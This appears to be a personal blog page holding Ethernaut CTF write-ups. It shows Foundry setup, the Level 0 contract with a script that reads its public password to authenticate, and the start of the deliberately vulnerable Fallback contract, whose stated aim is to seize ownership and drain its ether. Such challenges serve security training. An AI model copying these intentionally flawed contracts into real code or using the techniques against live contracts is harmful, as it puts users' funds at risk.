<!DOCTYPE html><!--xOmyQrz477VMR99oMhEMM--><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="preload" href="/_next/static/media/797e433ab948586e-s.p.dbea232f.woff2" as="font" crossorigin="" type="font/woff2"/><link rel="preload" href="/_next/static/media/caa3a2e1cccd8315-s.p.853070df.woff2" as="font" crossorigin="" type="font/woff2"/><link rel="preload" as="image" href="/images/ethernaut-delegate-address.png"/><link rel="stylesheet" href="/_next/static/chunks/8a80e7184ad3a13f.css" data-precedence="next"/><link rel="stylesheet" href="/_next/static/chunks/3aecbadcd45aebe7.css" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/4995e6db2daa090b.js"/><script src="/_next/static/chunks/7040e0a9a37df246.js" async=""></script><script src="/_next/static/chunks/01e9332dc3878a61.js" async=""></script><script src="/_next/static/chunks/32f4ce06fb5da485.js" async=""></script><script src="/_next/static/chunks/d995f95b0c6e0b87.js" async=""></script><script src="/_next/static/chunks/turbopack-503fe7d176a0168c.js" async=""></script><script src="/_next/static/chunks/13f8b9b460cab25b.js" async=""></script><script src="/_next/static/chunks/cc162e5663281663.js" async=""></script><script src="/_next/static/chunks/db909c0d74f8c046.js" async=""></script><script src="/_next/static/chunks/b05a5109468bf8e7.js" async=""></script><script src="/_next/static/chunks/63bdf154c4daac0e.js" async=""></script><meta name="next-size-adjust" content=""/><title>Satya Bhaskar Peruri</title><meta name="description" content="Security researcher, auditor, and blockchain developer specializing in smart contract security and Web3 development"/><meta name="generator" content="Me"/><link rel="icon" href="/sun9.png" media="(prefers-color-scheme: light)"/><link rel="icon" href="/sun9.png" media="(prefers-color-scheme: dark)"/><link rel="icon" href="/sun9.png" type="image/svg+xml"/><link rel="apple-touch-icon" href="/sun9.png"/><script src="/_next/static/chunks/a6dad97d9634a72d.js" noModule=""></script></head><body class="font-sans antialiased"><div hidden=""><!--$--><!--/$--></div><script>((a,b,c,d,e,f,g,h)=>{let i=document.documentElement,j=["light","dark"];function k(b){var c;(Array.isArray(a)?a:[a]).forEach(a=>{let c="class"===a,d=c&&f?e.map(a=>f[a]||a):e;c?(i.classList.remove(...d),i.classList.add(f&&f[b]?f[b]:b)):i.setAttribute(a,b)}),c=b,h&&j.includes(c)&&(i.style.colorScheme=c)}if(d)k(d);else try{let a=localStorage.getItem(b)||c,d=g&&"system"===a?window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light":a;k(d)}catch(a){}})("class","theme","dark",null,["light","dark"],null,true,true)</script><div class="min-h-screen"><header class="fixed top-0 left-0 right-0 z-50 border-b border-primary/20 bg-background/60 backdrop-blur-xl"><div class="absolute inset-0 bg-gradient-to-r from-primary/5 via-accent/5 to-secondary/5 pointer-events-none"></div><div class="mx-auto max-w-7xl px-4 sm:px-6 lg:px-8 relative z-10"><div class="flex h-16 items-center justify-between"><a class="flex items-center gap-2 group" href="/"><div class="relative"></div><span class="font-mono font-semibold text-lg bg-gradient-to-r from-foreground to-primary bg-clip-text">Satya Bhaskar Peruri</span></a><nav class="hidden md:flex items-center gap-8"><a class="text-sm font-medium text-muted-foreground hover:text-primary transition-colors relative group" href="/#about">About<span class="absolute -bottom-1 left-0 w-0 h-0.5 bg-gradient-to-r from-primary to-accent group-hover:w-full transition-all duration-300"></span></a><a class="text-sm font-medium text-muted-foreground hover:text-primary transition-colors relative group" href="/experience">Experience<span class="absolute -bottom-1 left-0 w-0 h-0.5 bg-gradient-to-r from-primary to-accent group-hover:w-full transition-all duration-300"></span></a><a class="text-sm font-medium text-muted-foreground hover:text-primary transition-colors relative group" href="/blogs">Blogs<span class="absolute -bottom-1 left-0 w-0 h-0.5 bg-gradient-to-r from-primary to-accent group-hover:w-full transition-all duration-300"></span></a><a class="text-sm font-medium text-muted-foreground hover:text-primary transition-colors relative group" href="/projects">Projects<span class="absolute -bottom-1 left-0 w-0 h-0.5 bg-gradient-to-r from-primary to-accent group-hover:w-full transition-all duration-300"></span></a><a class="text-sm font-medium text-muted-foreground hover:text-primary transition-colors relative group" href="/opensource">Open Source Contributions<span class="absolute -bottom-1 left-0 w-0 h-0.5 bg-gradient-to-r from-primary to-accent group-hover:w-full transition-all duration-300"></span></a><a class="text-sm font-medium text-muted-foreground hover:text-primary transition-colors relative group" href="/socials">Socials<span class="absolute -bottom-1 left-0 w-0 h-0.5 bg-gradient-to-r from-primary to-accent group-hover:w-full transition-all duration-300"></span></a></nav><button data-slot="button" class="inline-flex items-center justify-center gap-2 whitespace-nowrap rounded-md text-sm font-medium disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:text-accent-foreground dark:hover:bg-accent/50 size-9 ml-4 hover:bg-primary/10 border border-primary/20 hover:border-primary/40 transition-all"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-sun h-5 w-5 rotate-0 scale-100 transition-all dark:-rotate-90 dark:scale-0 text-primary"><circle cx="12" cy="12" r="4"></circle><path d="M12 2v2"></path><path d="M12 20v2"></path><path d="m4.93 4.93 1.41 1.41"></path><path d="m17.66 17.66 1.41 1.41"></path><path d="M2 12h2"></path><path d="M20 12h2"></path><path d="m6.34 17.66-1.41 1.41"></path><path d="m19.07 4.93-1.41 1.41"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-moon absolute h-5 w-5 rotate-90 scale-0 transition-all dark:rotate-0 dark:scale-100 text-primary"><path d="M12 3a6 6 0 0 0 9 9 9 9 0 1 1-9-9Z"></path></svg><span class="sr-only">Toggle theme</span></button></div></div></header><main class="pt-24 pb-16 px-4 sm:px-6 lg:px-8"><article class="mx-auto max-w-4xl"><a data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap rounded-md text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 h-9 px-4 py-2 has-[&gt;svg]:px-3 mb-8 gap-2" href="/blogs"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-arrow-left h-4 w-4"><path d="m12 19-7-7 7-7"></path><path d="M19 12H5"></path></svg>Back to Blogs</a><header class="mb-8"><h1 class="text-4xl md:text-5xl font-bold mb-4 text-balance">Ethernaut CTF Challenges Writeups</h1><div class="flex flex-wrap items-center gap-4 text-muted-foreground mb-4"><div class="flex items-center gap-2"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-calendar h-4 w-4"><path d="M8 2v4"></path><path d="M16 2v4"></path><rect width="18" height="18" x="3" y="4" rx="2"></rect><path d="M3 10h18"></path></svg><span>2023-11-01</span></div><div class="flex items-center gap-2"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-clock h-4 w-4"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg><span>30 min read</span></div></div><div class="flex flex-wrap gap-2"><span class="px-3 py-1 rounded-md bg-primary/10 text-primary text-sm font-medium">Solidity</span><span class="px-3 py-1 rounded-md bg-primary/10 text-primary text-sm font-medium">Ethernaut</span><span class="px-3 py-1 rounded-md bg-primary/10 text-primary text-sm font-medium">Openzeppelin</span><span class="px-3 py-1 rounded-md bg-primary/10 text-primary text-sm font-medium">CTF</span><span class="px-3 py-1 rounded-md bg-primary/10 text-primary text-sm font-medium">Writeups</span></div></header><div class="prose prose-lg dark:prose-invert max-w-none"><h2>Setup</h2>
<p>Install the foundry by using: <a href="https://book.getfoundry.sh/getting-started/installation">https://book.getfoundry.sh/getting-started/installation</a></p>
<p>Solved challenges repository: <a href="https://github.com/BhaskarPeruri/OZ_Ethernaut">https://github.com/BhaskarPeruri/OZ_Ethernaut</a></p>
<p>The challenge contracts are in <code>/src</code>.</p>
<p>Solution scripts are in  <code>/script</code>.</p>
<p>Setup the .env file in the repository and fill the following required fields.</p>
<pre><code>RPC_URL=
MY_ADDRESS=
PRIVATE_KEY=
</code></pre>
<h2>Hello Ethernaut</h2>
<p><strong>Level0.sol</strong></p>
<p>We have to deploy the instance and call the info() method on it and follow the given instructions to solve this challenge.</p>
<pre><div style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-solidity" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#6a9955">// SPDX-License-Identifier: MIT</span><span>
</span><span></span><span class="token" style="color:#569CD6">pragma</span><span> </span><span class="token" style="color:#569CD6">solidity</span><span> </span><span class="token" style="color:#d4d4d4">^</span><span class="token version" style="color:#b5cea8">0.8.0</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">Instance</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span>
<span>  </span><span class="token" style="color:#ce9178">string</span><span> </span><span class="token" style="color:#569CD6">public</span><span> password</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#ce9178">uint8</span><span> </span><span class="token" style="color:#569CD6">public</span><span> infoNum </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#b5cea8">42</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#ce9178">string</span><span> </span><span class="token" style="color:#569CD6">public</span><span> theMethodName </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#ce9178">&#x27;The method name is method7123949.&#x27;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#ce9178">bool</span><span> </span><span class="token" style="color:#569CD6">private</span><span> cleared </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#569cd6">false</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>  </span><span class="token" style="color:#6a9955">// constructor</span><span>
</span><span>  </span><span class="token" style="color:#569CD6">constructor</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">string</span><span> </span><span class="token" style="color:#569CD6">memory</span><span> _password</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    password </span><span class="token" style="color:#d4d4d4">=</span><span> _password</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>  </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">info</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#569CD6">pure</span><span> </span><span class="token" style="color:#569CD6">returns</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">string</span><span> </span><span class="token" style="color:#569CD6">memory</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">return</span><span> </span><span class="token" style="color:#ce9178">&#x27;You will find what you need in info1().&#x27;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>  </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">info1</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#569CD6">pure</span><span> </span><span class="token" style="color:#569CD6">returns</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">string</span><span> </span><span class="token" style="color:#569CD6">memory</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">return</span><span> </span><span class="token" style="color:#ce9178">&#x27;Try info2(), but with &quot;hello&quot; as a parameter.&#x27;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>  </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">info2</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">string</span><span> </span><span class="token" style="color:#569CD6">memory</span><span> param</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#569CD6">pure</span><span> </span><span class="token" style="color:#569CD6">returns</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">string</span><span> </span><span class="token" style="color:#569CD6">memory</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">if</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#dcdcaa">keccak256</span><span class="token" style="color:#d4d4d4">(</span><span>abi</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">encodePacked</span><span class="token" style="color:#d4d4d4">(</span><span>param</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">==</span><span> </span><span class="token" style="color:#dcdcaa">keccak256</span><span class="token" style="color:#d4d4d4">(</span><span>abi</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">encodePacked</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&#x27;hello&#x27;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>      </span><span class="token" style="color:#569CD6">return</span><span> </span><span class="token" style="color:#ce9178">&#x27;The property infoNum holds the number of the next info method to call.&#x27;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">return</span><span> </span><span class="token" style="color:#ce9178">&#x27;Wrong parameter.&#x27;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>  </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">info42</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#569CD6">pure</span><span> </span><span class="token" style="color:#569CD6">returns</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">string</span><span> </span><span class="token" style="color:#569CD6">memory</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">return</span><span> </span><span class="token" style="color:#ce9178">&#x27;theMethodName is the name of the next method.&#x27;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>  </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">method7123949</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#569CD6">pure</span><span> </span><span class="token" style="color:#569CD6">returns</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">string</span><span> </span><span class="token" style="color:#569CD6">memory</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">return</span><span> </span><span class="token" style="color:#ce9178">&#x27;If you know the password, submit it to authenticate().&#x27;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>  </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">authenticate</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">string</span><span> </span><span class="token" style="color:#569CD6">memory</span><span> passkey</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">if</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#dcdcaa">keccak256</span><span class="token" style="color:#d4d4d4">(</span><span>abi</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">encodePacked</span><span class="token" style="color:#d4d4d4">(</span><span>passkey</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">==</span><span> </span><span class="token" style="color:#dcdcaa">keccak256</span><span class="token" style="color:#d4d4d4">(</span><span>abi</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">encodePacked</span><span class="token" style="color:#d4d4d4">(</span><span>password</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>      cleared </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#569cd6">true</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>  </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">getCleared</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#569CD6">view</span><span> </span><span class="token" style="color:#569CD6">returns</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">bool</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">return</span><span> cleared</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span></code></div></pre>
<p><strong>Level0Solution.s.sol</strong></p>
<pre><div style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-solidity" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#6a9955">// SPDX-License-Identifier: MIT</span><span>
</span><span></span><span class="token" style="color:#569CD6">pragma</span><span> </span><span class="token" style="color:#569CD6">solidity</span><span> </span><span class="token" style="color:#d4d4d4">^</span><span class="token version" style="color:#b5cea8">0.8.0</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;../src/Level0.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;forge-std/Script.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;forge-std/console.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">Level0Sol</span><span> </span><span class="token" style="color:#569CD6">is</span><span> Script</span><span class="token" style="color:#d4d4d4">{</span><span>
</span>
<span>    Instance </span><span class="token" style="color:#569CD6">public</span><span> level0 </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">Instance</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">0x45788399AFea13881872eA360A071f86E3D946fb</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">run</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span class="token" style="color:#d4d4d4">{</span><span>
</span>
<span>        </span><span class="token" style="color:#ce9178">string</span><span> </span><span class="token" style="color:#569CD6">memory</span><span> password </span><span class="token" style="color:#d4d4d4">=</span><span> level0</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">password</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        console</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">log</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;Password:&quot;</span><span class="token" style="color:#d4d4d4">,</span><span>password</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">startBroadcast</span><span class="token" style="color:#d4d4d4">(</span><span>vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">envUint</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;PRIVATE_KEY&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        level0</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">authenticate</span><span class="token" style="color:#d4d4d4">(</span><span>password</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">stopBroadcast</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span></code></div></pre>
<p><strong>To run the script</strong></p>
<pre><code>$ source .env
$ forge script script/Level0Solution.s.sol:Level0Sol --rpc-url $RPC_URL --broadcast
</code></pre>
<h2>Fallback</h2>
<p><strong>Level1.sol</strong></p>
<pre><div style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-solidity" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#6a9955">// SPDX-License-Identifier: MIT</span><span>
</span><span></span><span class="token" style="color:#569CD6">pragma</span><span> </span><span class="token" style="color:#569CD6">solidity</span><span> </span><span class="token" style="color:#d4d4d4">^</span><span class="token version" style="color:#b5cea8">0.8.0</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#6a9955">//objectives --claim ownership of  the token and drain it&#x27;s eth</span><span>
</span><span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">Fallback</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span>
<span>  </span><span class="token" style="color:#569CD6">mapping</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span> </span><span class="token" style="color:#d4d4d4">=&gt;</span><span> </span><span class="token" style="color:#ce9178">uint</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> contributions</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#ce9178">address</span><span> </span><span class="token" style="color:#569CD6">public</span><span> owner</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>  </span><span class="token" style="color:#569CD6">constructor</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    owner </span><span class="token" style="color:#d4d4d4">=</span><span> msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    contributions</span><span class="token" style="color:#d4d4d4">[</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender</span><span class="token" style="color:#d4d4d4">]</span><span> </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#b5cea8">1000</span><span> </span><span class="token" style="color:#d4d4d4">*</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">1</span><span> ether</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>  </span><span class="token" style="color:#569CD6">modifier</span><span> onlyOwner </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        </span><span class="token" style="color:#569CD6">require</span><span class="token" style="color:#d4d4d4">(</span><span>
</span><span>            msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender </span><span class="token" style="color:#d4d4d4">==</span><span> owner</span><span class="token" style="color:#d4d4d4">,</span><span>
</span><span>            </span><span class="token" style="color:#ce9178">&quot;caller is not the owner&quot;</span><span>
</span><span>        </span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#569CD6">_</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>  </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">contribute</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#569CD6">payable</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">require</span><span class="token" style="color:#d4d4d4">(</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span>value </span><span class="token" style="color:#d4d4d4">&lt;</span><span> </span><span class="token" style="color:#b5cea8">0.001</span><span> ether</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
